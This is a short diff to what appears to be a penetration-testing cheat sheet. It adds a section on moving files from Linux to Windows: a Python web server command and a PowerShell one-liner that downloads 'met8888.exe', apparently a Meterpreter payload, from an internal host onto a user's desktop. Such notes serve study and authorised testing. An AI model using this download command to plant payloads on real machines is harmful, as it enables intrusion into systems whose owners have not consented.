@@ -115,4 +115,11 @@ nmap -sn 192.168.1.1/24
 ### Identify smb or netbios services
 nbtscan 192.168.1.0/24
 
+#----- Transferring Files from Linux to Windows -----#
+### Python Webserver 
+python -m SimpleHTTPServer
+
+### Transfer to Windows with no broswer
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"
+
 
